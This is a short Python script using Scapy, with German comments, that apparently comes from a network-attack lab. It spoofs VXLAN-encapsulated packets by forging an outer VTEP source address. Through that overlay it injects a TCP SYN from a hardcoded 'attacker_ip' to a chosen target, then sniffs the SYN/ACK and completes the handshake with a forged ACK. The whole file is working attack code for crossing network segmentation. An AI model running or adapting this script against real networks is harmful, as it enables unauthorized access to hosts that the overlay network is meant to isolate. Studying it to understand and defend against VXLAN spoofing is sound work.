#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Usage:
./tcp_connect.py IP Port

./tcp_connect.py 10.0.0.10 80

 """
from scapy.all import *
from scapy.layers.http import *
from scapy.layers import http
import random
import sys
import threading
from threading import Thread
import time
import webbrowser
import os


### Variabeln definieren
vtep_dst = "192.168.10.149"
vtep_src = "172.20.10.254" #Hier muss eine IP aus meinem Subnetz stehen, sonst verwirft der erste Hop das Paket!
vxlanport = 4789
vx_vnid = 1
random_mac = "be:fb:ef:be:fb:ef"
mac_dst = "ea:e4:59:b5:42:03" #"ff:ff:ff:ff:ff:ff"
attacker_ip = "172.20.10.10"
destination_ip = sys.argv[1]
s_port = random.randint(20000,65500)
d_port = int(sys.argv[2])

### TCP-Flags definieren
Flags = {"FIN": 0x01,"SYN": 0x02,"RST": 0x04,"PSH": 0x08,"ACK": 0x10,"URG": 0x20,"ECE": 0x40,"CWR": 0x80}
# Outer Header for VxLAN-Spoofing
spoof_vxlan = IP(src=vtep_src,dst=vtep_dst)/UDP(sport=vxlanport,dport=vxlanport)/VXLAN(vni=vx_vnid,flags="Instance")

def send_spoofed_TCP(_seq, _ack, _flags):
    send(spoof_vxlan / IP(src=attacker_ip,dst=destination_ip) / TCP(sport=s_port, dport=d_port, seq=_seq, ack=_ack, flags=_flags))
    return

# send SYN Packet
send_spoofed_TCP(0,0,"S")
#receive SYN/ACK Packet and send ACK Packet
sniff( filter= "tcp[13] == 18", prn= lambda x: send_spoofed_TCP(x[TCP].ack, x[TCP].seq + 1, "A"), count= 1, timeout= 5)




